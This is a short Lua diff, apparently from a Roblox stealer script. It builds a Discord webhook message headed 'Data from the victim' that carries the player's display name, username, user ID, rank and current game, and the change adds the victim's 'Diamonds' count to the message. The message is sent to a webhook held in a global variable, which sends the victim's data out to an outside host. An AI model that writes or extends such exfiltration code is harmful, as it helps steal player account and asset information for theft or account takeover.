@@ -27,8 +27,15 @@ local msg = {
       ["description"]= "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."",
       ["url"]= "https://discord.gg/34fs3FWt",
       ["color"]= ""..webhookcolor.."",
+      ["fields"]= {
+        {
+          ["name"]= "Diamonds 💎",
+          ["value"]= "```".._G.Diamonds.."```",
+          ["inline"]= true
+        }
     }
-  },
+}
+},
   ["attachments"] = {}
 }
 local Webhook = _G.Webhook
